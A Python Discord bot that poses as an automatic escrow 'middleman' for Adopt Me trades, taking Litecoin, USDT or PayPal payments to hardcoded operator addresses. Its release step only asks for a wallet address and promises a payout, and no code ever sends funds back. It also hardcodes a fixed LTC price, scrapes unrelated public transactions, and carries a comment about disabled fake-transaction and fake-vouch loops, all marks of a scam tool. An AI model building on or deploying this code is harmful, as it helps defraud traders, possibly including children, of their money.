#!/usr/bin/env python3
"""
Adoptme Trading Place – Discord Middleman Bot (Railway-Ready)
"""

import discord
from discord.ext import commands
import random
import os
import asyncio
import aiohttp

# =====================================================
# CONFIGURATION
# =====================================================
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
VOUCH_CHANNEL_ID = 1553670469595439144
TICKET_CATEGORY_ID = 1550036025865150474
LTC_ADDRESS = "LcSWPKEodNiuSEvDX8kG3dTMgBARKASUNR"
USDT_ADDRESS = "0x09663e05d761746cb7a624F088902e2DC79bC4f0"
BSCSCAN_API_KEY = os.getenv("BSCSCAN_API_KEY", "")
PAYPAL_LINK = os.getenv("PAYPAL_LINK", "")
PANEL_BANNER_URL = os.getenv("PANEL_BANNER_URL", "")
LTC_MIN_INTERVAL = 60
LTC_MAX_INTERVAL = 300
USDT_MIN_INTERVAL = 60
USDT_MAX_INTERVAL = 300

# =====================================================
# BOT SETUP
# =====================================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

pending_tickets = {}
used_amounts = []
amount_index = 0
ltc_tx_cache = []
usdt_tx_cache = []

# =====================================================
# UNIQUE AMOUNT POOL
# =====================================================
def generate_amount_pool():
    amounts = [round(i * 0.01, 2) for i in range(100, 100001)]
    random.shuffle(amounts)
    return amounts

def get_next_unique_amount():
    global used_amounts, amount_index
    if amount_index >= len(used_amounts):
        used_amounts = generate_amount_pool()
        amount_index = 0
    amount = used_amounts[amount_index]
    amount_index += 1
    return amount

# =====================================================
# TRANSACTION SCRAPERS
# =====================================================
async def fetch_ltc_transactions():
    try:
        url = "https://api.blockchair.com/litecoin/transactions?limit=20"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                data = await resp.json()
                txs = []
                for tx in data["data"]:
                    hash_ = tx["transaction"]["hash"]
                    value = tx["transaction"]["output_total"] / 1e8
                    usd = value * 85
                    txs.append((round(usd, 2), hash_))
                return txs
    except:
        return []

async def fetch_usdt_transactions():
    try:
        url = (
            f"https://api.bscscan.com/api?module=account&action=tokentx"
            f"&address={USDT_ADDRESS}&sort=desc&offset=20&apikey={BSCSCAN_API_KEY}"
        )
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                data = await resp.json()
                txs = []
                for tx in data["result"]:
                    hash_ = tx["hash"]
                    value = int(tx["value"]) / 1e18
                    txs.append((value, hash_))
                return txs
    except:
        return []

# =====================================================
# CONFIRMATION EMBED
# =====================================================
async def send_confirmation_embed(channel, ticket, usd=None):
    if usd is None:
        usd = ticket["expected_amount"]

    if "PayPal" in ticket["payment_type"]:
        embed = discord.Embed(
            title="<a:BU_verify:1524077666741780710> Payment Confirmation",
            color=0x00FF00,
            description="The following PayPal payment has been detected and verified."
        )
        embed.add_field(name="USD Amount", value=f"`$ {usd:.2f}`", inline=False)
        embed.add_field(name="Payment Method", value="PayPal", inline=False)
        embed.add_field(name="Status", value="**Confirmed**", inline=False)
        embed.set_footer(text="Sparkle's MM Auto Middleman")
        view = discord.ui.View(timeout=None)
        view.add_item(
            discord.ui.Button(
                label="Release",
                style=discord.ButtonStyle.success,
                custom_id=f"release_{ticket['sender_id']}"
            )
        )
        await channel.send(embed=embed, view=view)
        return

    is_ltc = "Litecoin" in ticket["payment_type"]
    crypto = "LTC" if is_ltc else "USDT"
    address = LTC_ADDRESS if is_ltc else USDT_ADDRESS
    rate = 85 if is_ltc else 1
    crypto_amount = round(usd / rate, 6 if is_ltc else 2)

    embed = discord.Embed(
        title="<a:BU_verify:1524077666741780710> Transaction Confirmation",
        color=0x00FF00,
        description="The following transaction has been detected and verified."
    )
    embed.add_field(name="USD Amount", value=f"`$ {usd:.2f}`", inline=False)
    embed.add_field(name=f"{crypto} Amount", value=f"`{crypto_amount}`", inline=False)
    embed.add_field(name="Payment Address", value=f"`{address}`", inline=False)
    embed.add_field(name="Status", value="**Confirmed**", inline=False)
    embed.add_field(
        name="Need Help?",
        value="If the funds have not been released after 30 minutes, please contact us or create a support ticket and an admin will assist you shortly.",
        inline=False
    )
    embed.set_footer(text="Adoptme Trading Place Auto Middleman")
    view = discord.ui.View(timeout=None)
    view.add_item(
        discord.ui.Button(
            label="Release",
            style=discord.ButtonStyle.success,
            custom_id=f"release_{ticket['sender_id']}"
        )
    )
    await channel.send(embed=embed, view=view)

# =====================================================
# TRANSACTION MONITORS
# =====================================================
async def bsc_monitor():
    while True:
        await asyncio.sleep(30)
        if not pending_tickets:
            continue
        try:
            url = f"https://api.bscscan.com/api?module=account&action=tokentx&address={USDT_ADDRESS}&sort=desc&offset=10&apikey={BSCSCAN_API_KEY}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    data = await resp.json()
                    if data["status"] != "1":
                        continue
                    for tx in data["result"]:
                        value = int(tx["value"]) / 1e18
                        for ch_id, ticket in list(pending_tickets.items()):
                            if "USDT" in ticket["payment_type"] and abs(value - ticket["expected_amount"]) / ticket["expected_amount"] < 0.02:
                                channel = bot.get_channel(ch_id)
                                if channel:
                                    await send_confirmation_embed(channel, ticket)
                                del pending_tickets[ch_id]
        except:
            pass

async def ltc_monitor():
    while True:
        await asyncio.sleep(30)
        if not pending_tickets:
            continue
        try:
            url = f"https://api.blockchair.com/litecoin/dashboards/address/{LTC_ADDRESS}?limit=10"
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    data = await resp.json()
                    txs = data["data"][LTC_ADDRESS]["transactions"]
                    for tx_hash in txs:
                        tx_url = f"https://api.blockchair.com/litecoin/transactions/{tx_hash}"
                        async with session.get(tx_url) as tx_resp:
                            tx_data = await tx_resp.json()
                            tx = tx_data["data"][tx_hash]["transaction"]
                            for out in tx["outputs"]:
                                if out["recipient"] == LTC_ADDRESS:
                                    value_ltc = out["value"] / 1e8
                                    for ch_id, ticket in list(pending_tickets.items()):
                                        if "Litecoin" in ticket["payment_type"]:
                                            expected_ltc = ticket["expected_amount"] / 85
                                            if abs(value_ltc - expected_ltc) / expected_ltc < 0.02:
                                                channel = bot.get_channel(ch_id)
                                                if channel:
                                                    await send_confirmation_embed(channel, ticket)
                                                del pending_tickets[ch_id]
        except:
            pass

# =====================================================
# TICKET CREATION
# =====================================================
class CryptoDropdown(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Litecoin (LTC)", emoji="<:ltc:1524009674993700875>"),
            discord.SelectOption(label="USDT [BEP-20]", emoji="<:usdt:1524041260434854060>"),
            discord.SelectOption(label="PayPal", emoji="💳"),
        ]
        super().__init__(placeholder="Make a selection", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if "Litecoin" in selected:
            choice = "Litecoin"
        elif "USDT" in selected:
            choice = "USDT[BEP-20]"
        else:
            choice = "PayPal"
        modal = discord.ui.Modal(title=f"Create {choice} Ticket")
        modal.add_item(discord.ui.TextInput(label="Paste Your Trader's Username or ID", placeholder="e.g.: sparkle / 6927519863519735286", required=True, max_length=100))
        modal.add_item(discord.ui.TextInput(label="What are you giving?", style=discord.TextStyle.paragraph, placeholder="Describe your items or crypto...", required=True, max_length=500))
        modal.add_item(discord.ui.TextInput(label="What is your trader giving?", style=discord.TextStyle.paragraph, placeholder="Describe their items or crypto...", required=True, max_length=500))

        async def on_submit(modal_interaction):
            trader_input = modal.children[0].value
            giving = modal.children[1].value
            receiving = modal.children[2].value
            await create_ticket(modal_interaction, choice, trader_input, giving, receiving)

        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

async def create_ticket(interaction, payment_type, trader_input, giving, receiving):
    await interaction.response.defer(ephemeral=True)
    category = interaction.guild.get_channel(TICKET_CATEGORY_ID)
    if not category:
        await interaction.followup.send("Ticket category not found.", ephemeral=True)
        return

    guild = interaction.guild
    trader = None
    inp = trader_input.strip()

    if inp.startswith('<@') and inp.endswith('>'):
        uid = inp.replace('<@', '').replace('>', '').replace('!', '')
        trader = guild.get_member(int(uid))
    elif inp.isdigit() and len(inp) >= 17:
        trader = guild.get_member(int(inp))
    else:
        query = inp.lower().replace('@', '')
        for m in guild.members:
            if m.name.lower() == query or m.display_name.lower() == query or str(m).lower() == query:
                trader = m
                break
        if not trader:
            for m in guild.members:
                if query in m.name.lower() or query in m.display_name.lower() or query in str(m).lower():
                    trader = m
                    break

    if not trader:
        await interaction.followup.send(f"Could not find user `{trader_input}`.", ephemeral=True)
        return
    if trader.id == interaction.user.id:
        await interaction.followup.send("You cannot create a ticket with yourself.", ephemeral=True)
        return

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
        trader: discord.PermissionOverwrite(view_channel=True, send_messages=True),
    }
    channel = await guild.create_text_channel(
        name=f"ticket-{interaction.user.name}",
        category=category,
        overwrites=overwrites
    )

    pending_tickets[channel.id] = {
        "expected_amount": 0,
        "sender_id": interaction.user.id,
        "receiver_id": trader.id,
        "payment_address": "Not set yet",
        "payment_type": payment_type,
    }

    trade_msg = (
        f"{interaction.user.mention} {trader.mention}\n"
        f"### Adoptme Trading Place\n"
        f"> Make sure to follow the steps and read the instructions thoroughly.\n"
        f"> Please explicitly state the trade details if the information below is inaccurate.\n"
        f"> By using this bot, you agree to our ToS <#1501511000115904632>.\n"
        f"{interaction.user.mention}'s side:\n```{giving}```\n"
        f"{trader.mention}'s side:\n```{receiving}```"
    )
    await channel.send(trade_msg)

    role_embed = discord.Embed(
        title="Select Your Role",
        color=0x5865F2,
        description=f"> - **Sender** if you are Sending {payment_type} to the bot.\n"
                    f"> - **Receiver** if you are Receiving {payment_type} later from the bot.\n\n"
                    f"**Senders:**\n*None yet*\n\n**Receivers:**\n*None yet*"
    )
    view = RoleSelectView(payment_type)
    await channel.send(embed=role_embed, view=view)
    await interaction.followup.send(f"Ticket created: {channel.mention}", ephemeral=True)

# =====================================================
# ROLE SELECTION UI
# =====================================================
class RoleSelectView(discord.ui.View):
    def __init__(self, payment_type):
        super().__init__(timeout=None)
        self.payment_type = payment_type
        self.senders = set()
        self.receivers = set()
        self.confirm_msg = None
        self.confirmed = set()

    @discord.ui.button(label="Sender", style=discord.ButtonStyle.primary)
    async def sender(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.senders.add(interaction.user.id)
        self.receivers.discard(interaction.user.id)
        await interaction.response.edit_message(embed=self.build_embed(), view=self)
        if self.senders and self.receivers and not self.confirm_msg:
            await self.prompt_confirmation(interaction.channel)

    @discord.ui.button(label="Receiver", style=discord.ButtonStyle.success)
    async def receiver(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.receivers.add(interaction.user.id)
        self.senders.discard(interaction.user.id)
        await interaction.response.edit_message(embed=self.build_embed(), view=self)
        if self.senders and self.receivers and not self.confirm_msg:
            await self.prompt_confirmation(interaction.channel)

    @discord.ui.button(label="Reset", style=discord.ButtonStyle.danger)
    async def reset(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.senders.clear()
        self.receivers.clear()
        self.confirmed.clear()
        if self.confirm_msg:
            await self.confirm_msg.delete()
            self.confirm_msg = None
        await interaction.response.edit_message(embed=self.build_embed(), view=self)

    def build_embed(self):
        s = "\n".join(f"<@{uid}>" for uid in self.senders) or "*None yet*"
        r = "\n".join(f"<@{uid}>" for uid in self.receivers) or "*None yet*"
        return discord.Embed(
            title="Select Your Role",
            color=0x5865F2,
            description=f"> - **Sender** if you are Sending {self.payment_type} to the bot.\n"
                        f"> - **Receiver** if you are Receiving {self.payment_type} later from the bot.\n\n"
                        f"**Senders:**\n{s}\n\n**Receivers:**\n{r}"
        )

    async def prompt_confirmation(self, channel):
        sender_id = list(self.senders)[0]
        receiver_id = list(self.receivers)[0]
        embed = discord.Embed(title="Is this information correct?", color=0x5865F2)
        embed.add_field(name="Sender", value=f"<@{sender_id}>", inline=True)
        embed.add_field(name="Receiver", value=f"<@{receiver_id}>", inline=True)
        embed.set_footer(text="Make sure you have selected the right role! If you didn't then click Incorrect.")
        view = ConfirmRoleView(self, self.payment_type, sender_id, receiver_id)
        self.confirm_msg = await channel.send(embed=embed, view=view)

class ConfirmRoleView(discord.ui.View):
    def __init__(self, role_view, payment_type, sender_id, receiver_id):
        super().__init__(timeout=None)
        self.role_view = role_view
        self.payment_type = payment_type
        self.sender_id = sender_id
        self.receiver_id = receiver_id

    @discord.ui.button(label="Correct", style=discord.ButtonStyle.success)
    async def correct(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in (self.sender_id, self.receiver_id):
            await interaction.response.send_message("You are not part of this trade.", ephemeral=True)
            return
        self.role_view.confirmed.add(interaction.user.id)
        if len(self.role_view.confirmed) >= 2:
            await interaction.response.edit_message(view=None)
            embed = discord.Embed(color=0x5865F2, description=f"<@{self.sender_id}>\nSet the amount in USD value")
            view = SetAmountView(self.payment_type, self.sender_id, self.receiver_id)
            await interaction.channel.send(embed=embed, view=view)

    @discord.ui.button(label="Incorrect", style=discord.ButtonStyle.danger)
    async def incorrect(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.role_view.senders.clear()
        self.role_view.receivers.clear()
        self.role_view.confirmed.clear()
        if self.role_view.confirm_msg:
            await self.role_view.confirm_msg.delete()
            self.role_view.confirm_msg = None
        await interaction.response.send_message(f"{interaction.user.mention} marked the roles as incorrect. Please restart.")
        await interaction.message.delete()

class SetAmountView(discord.ui.View):
    def __init__(self, payment_type, sender_id, receiver_id):
        super().__init__(timeout=None)
        self.payment_type = payment_type
        self.sender_id = sender_id
        self.receiver_id = receiver_id

    @discord.ui.button(label="Set USD Amount", style=discord.ButtonStyle.primary)
    async def set_amount(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.sender_id:
            await interaction.response.send_message("Only the sender can set the amount.", ephemeral=True)
            return
        modal = discord.ui.Modal(title="Set USD Amount")
        modal.add_item(discord.ui.TextInput(label="Enter USD amount", placeholder="e.g. 5.00", required=True))
        async def on_submit(modal_interaction):
            try:
                amount = float(modal.children[0].value)
            except ValueError:
                await modal_interaction.response.send_message("Invalid amount.", ephemeral=True)
                return
            embed = discord.Embed(color=0x5865F2, description=f"**USD Amount set to {amount:.2f}**\nPlease confirm the USD amount.")
            view = ConfirmAmountView(self.payment_type, self.sender_id, self.receiver_id, amount)
            await modal_interaction.response.send_message(embed=embed, view=view)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

class ConfirmAmountView(discord.ui.View):
    def __init__(self, payment_type, sender_id, receiver_id, amount):
        super().__init__(timeout=None)
        self.payment_type = payment_type
        self.sender_id = sender_id
        self.receiver_id = receiver_id
        self.amount = amount
        self.confirmed = set()

    @discord.ui.button(label="Correct", style=discord.ButtonStyle.success)
    async def correct(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in (self.sender_id, self.receiver_id):
            await interaction.response.send_message("You are not part of this trade.", ephemeral=True)
            return
        self.confirmed.add(interaction.user.id)
        if len(self.confirmed) >= 2:
            await interaction.response.edit_message(view=None)
            await send_payment_embed(interaction.channel, self.payment_type, self.sender_id, self.receiver_id, self.amount)

    @discord.ui.button(label="Incorrect", style=discord.ButtonStyle.danger)
    async def incorrect(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(f"{interaction.user.mention} marked the amount as incorrect. <@{self.sender_id}> please re-enter.")
        embed = discord.Embed(color=0x5865F2, description=f"<@{self.sender_id}>\nSet the amount in USD value")
        view = SetAmountView(self.payment_type, self.sender_id, self.receiver_id)
        await interaction.message.delete()
        await interaction.channel.send(embed=embed, view=view)

async def send_payment_embed(channel, payment_type, sender_id, receiver_id, usd):
    if "PayPal" in payment_type:
        embed = discord.Embed(
            title="💳 Payment Information",
            color=0x2F3136,
            description=(
                f"Make sure to send the **EXACT** amount in USD.\n\n"
                f"**USD Amount**\n`$ {usd:.2f}`\n\n"
                f"**Payment Link**\n[PayPal]({PAYPAL_LINK})\n\n"
                "This ticket will be closed within 20 minutes if no payment was detected."
            )
        )
        embed.set_footer(text="Adotpme Trading Place Auto Middleman")
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="Copy Details", style=discord.ButtonStyle.primary))
        await channel.send(f"<@{sender_id}> Send the USD to the following PayPal link.", embed=embed, view=view)

        await channel.send(embed=discord.Embed(
            title="<a:Loading:1524009723664531498> Awaiting Payment",
            color=0xF0B429,
            description=(
                "**Waiting for payment confirmation…**\n\n"
                "• Send the exact amount shown above.\n"
                "• Once detected, the transaction will be verified.\n"
                "• The sender may then release the funds.\n\n"
                "Please do not close this ticket."
            )
        ).set_footer(text="⋆ ℳinstrea 𓂃 MM Auto Middleman"))

        pending_tickets[channel.id] = {
            "expected_amount": usd,
            "sender_id": sender_id,
            "receiver_id": receiver_id,
            "payment_address": PAYPAL_LINK,
            "payment_type": payment_type,
        }
        return

    is_ltc = "Litecoin" in payment_type
    address = LTC_ADDRESS if is_ltc else USDT_ADDRESS
    crypto = "LTC" if is_ltc else "USDT"
    rate = 85 if is_ltc else 1
    crypto_amount = round(usd / rate, 6 if is_ltc else 2)
    emoji = "<:ltc:1524009674993700875>" if is_ltc else "<:usdt:1524041260434854060>"

    embed = discord.Embed(
        title=f"{emoji} Payment Information",
        color=0x2F3136,
        description=(
            f"Make sure to send the **EXACT** amount in {crypto}.\n\n"
            f"**USD Amount**\n`$ {usd:.2f}`\n\n"
            f"**{crypto} Amount**\n`{crypto_amount}`\n\n"
            f"**Payment Address**\n`{address}`\n\n"
            f"Current {crypto} Price: ${rate:.2f}\n"
            "This ticket will be closed within 20 minutes if no transaction was detected."
        )
    )
    embed.set_footer(text="Adoptme Trading Place Auto MM")
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Copy Details", style=discord.ButtonStyle.primary))
    await channel.send(f"<@{sender_id}> Send the {crypto} to the following address.", embed=embed, view=view)

    await channel.send(embed=discord.Embed(
        title="<a:Loading:1524009723664531498> Awaiting Transaction",
        color=0xF0B429,
        description=(
            "**Waiting for blockchain confirmation…**\n\n"
            "• Send the exact amount shown above.\n"
            "• Once detected, the transaction will be verified.\n"
            "• The sender may then release the funds.\n\n"
            "Please do not close this ticket."
        )
    ).set_footer(text="Adoptme Trading Place Auto Middleman"))

    pending_tickets[channel.id] = {
        "expected_amount": usd,
        "sender_id": sender_id,
        "receiver_id": receiver_id,
        "payment_address": address,
        "payment_type": payment_type,
    }

# =====================================================
# COMMANDS
# =====================================================
@bot.command(name="panel")
async def panel(ctx):
    """Post the Adoptme Trading Place service panel and payment selector."""
    embed = discord.Embed(
        title="Adoptme Trading Place",
        color=0x2B2D31,
        description=(
            "• **Paid Service**\n"
            "• Read our ToS before using the bot: <#1556816545219354624>\n"
            "• Make sure both traders agree on the trade details."
        ),
    )
    embed.add_field(
        name="Fees:",
        value=(
            "• Deals $250+: $1.50\n"
            "• Deals under $250: $0.50\n"
            "• Deals under $50 are FREE"
        ),
        inline=False,
    )
    if PANEL_BANNER_URL:
        embed.set_image(url=PANEL_BANNER_URL)
    embed.set_footer(text="Adoptme Trading Place")

    view = discord.ui.View(timeout=None)
    view.add_item(
        discord.ui.Button(
            label="Tutorial",
            url="https://youtu.be/XIkpcT2WNPI?feature=shared",
        )
    )
    await ctx.send(embed=embed, view=view)

    dropdown_view = discord.ui.View(timeout=None)
    dropdown_view.add_item(CryptoDropdown())
    await ctx.send("Select your payment method:", view=dropdown_view)

@bot.command(name="tickets")
async def tickets(ctx):
    if not pending_tickets:
        await ctx.send("No active tickets.")
        return
    msg = "**Active Tickets:**\n"
    for ch_id, ticket in pending_tickets.items():
        ch = bot.get_channel(ch_id)
        msg += f"- `{ch_id}` ({ch.name if ch else 'unknown'}) — ${ticket['expected_amount']:.2f}\n"
    await ctx.send(msg)

@bot.command(name="help")
async def help_cmd(ctx):
    await ctx.send("Commands: `!panel`, `!tickets`, `!help`.")

# =====================================================
# INTERACTION HANDLER
# =====================================================
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        cid = interaction.data.get("custom_id", "")
        if cid.startswith("release_"):
            sender_id = int(cid.split("_")[1])
            if interaction.user.id != sender_id:
                await interaction.response.send_message("Only the sender can release the funds.", ephemeral=True)
                return
            modal = discord.ui.Modal(title="Enter Your Wallet Address")
            modal.add_item(discord.ui.TextInput(label="Wallet Address", placeholder="0x...", required=True))
            async def on_submit(modal_interaction):
                addr = modal.children[0].value
                await modal_interaction.response.send_message(f"Address received: `{addr}`. Funds will be released shortly.", ephemeral=True)
            modal.on_submit = on_submit
            await interaction.response.send_modal(modal)

# =====================================================
# STARTUP
# =====================================================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    global ltc_tx_cache, usdt_tx_cache
    ltc_tx_cache = await fetch_ltc_transactions()
    usdt_tx_cache = await fetch_usdt_transactions()
        # Fake transaction/vouch loops are intentionally disabled.
    asyncio.create_task(ltc_monitor())
    asyncio.create_task(bsc_monitor())
    print("All systems running")

if not TOKEN:
    raise RuntimeError("Set the DISCORD_BOT_TOKEN environment variable before starting the bot.")
bot.run(TOKEN)
